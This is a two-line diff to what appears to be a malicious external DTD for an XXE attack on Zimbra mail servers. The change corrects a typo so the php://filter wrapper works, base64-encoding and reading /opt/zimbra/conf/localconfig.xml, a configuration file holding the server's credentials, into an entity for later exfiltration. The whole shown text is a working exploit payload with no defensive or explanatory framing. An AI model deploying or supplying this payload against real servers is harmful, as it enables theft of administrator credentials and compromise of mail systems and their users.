@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "php://filter/read=covert.base64-encode/resource=file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///opt/zimbra/conf/localconfig.xml">
 <!ENTITY % all "<!ENTITY fileContents '%file;'>">
